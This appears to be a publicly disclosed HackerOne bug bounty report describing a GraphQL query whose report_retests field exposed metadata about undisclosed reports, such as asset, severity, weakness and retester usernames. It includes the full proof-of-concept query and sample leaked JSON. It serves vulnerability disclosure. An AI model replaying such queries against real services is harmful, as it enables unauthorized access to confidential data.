# Unauthorized access to metadata of undisclosed reports that were retested

## Report Details
- **Report ID**: 871749
- **URL**: https://hackerone.com/reports/871749
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-05-12T13:05:13.465Z
- **Disclosed**: 2020-06-05T01:35:52.566Z

## Reporter
- **Username**: msdian7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
`report_retests` object in `User` node discloses some information about undisclosed report

**Description:**
An attacker can get some infomation such as "asset_name" , "asset_type" , "severity_rating" , "weakness_name" of undisclosed report

### Steps To Reproduce

1. Invoke the below graphql call 

POST /graphql HTTP/1.1
Host: hackerone.com

```
{"operationName":"UserMiniProfile","variables":{"username":"msdian7"},"query":"query UserMiniProfile($username: String!) {\n  user(username: $username) {\n    id\n    ...UserMiniProfileLayout\n    __typename\n  }\n}\n\nfragment UserMiniProfileLayout on User {\n  id\n  large_profile_picture: profile_picture(size: large)\n  name\n  username\n  bio\n  reputation\n  signal\n  report_retests{total_count,approved_count,nodes{report{_id},created_at,asset_name,asset_type,award_amount,claimed_at,report_state,weakness_name,severity_rating,report_substate,report_retest_users{total_count,nodes{_id,user{username},state,invitation{id}}}}}\n  cleared\n  __typename\n}\n"}
```

2.  You will get below response 

```
████
```
3.  From that above response search for "report":null  , all that "report":null json objects are , undisclosed report , i take the last json object for my POC 

{"report":null,"created_at":"2020-05-11T19:21:25.507Z","asset_name":"https://www.hackerone.com","asset_type":"URL","award_amount":"50.00","claimed_at":null,"report_state":"closed","weakness_name":null,"severity_rating":"low","report_substate":"resolved","report_retest_users":{"total_count":1,"nodes":[{"_id":"███","user":{"username":"██████████"},"state":"approved","invitation":null}

from this json, we  can see user █████ retested one undisclosed report . 
 and the informations about that undisclosed report are ,
a. That report filed to "https://www.hackerone.com"
b. severity of that report is "low"


We can see some other  undisclosed reports too .

the another example is ,

{"report":null,"created_at":"2020-03-17T22:20:07.215Z","asset_name":"https://hackerone.com","asset_type":"URL","award_amount":"0.00","claimed_at":null,"report_state":"closed","weakness_name":"Information Disclosure","severity_rating":"medium","report_substate":"resolved","report_retest_users":{"total_count":1,"nodes":[{"_id":"███████","user":{"username":"████"},"state":"unassigned","invitation":null}]}

This is another undisclosed report, filed to "https://hackerone.com" asset with the "Information Disclosure" weakness and severity of report is "medium"

@security program, has more undisclosed report, so we cant detect exact undisclosed report, Consider if a new program start to use hackerone.com and uses retest feature , we can get that program's  asset_name , asset_type, weakness_name and severity_rating without disclosure of that report

## Impact

an attacker can get Information of undisclosed report

## Attachments
No attachments
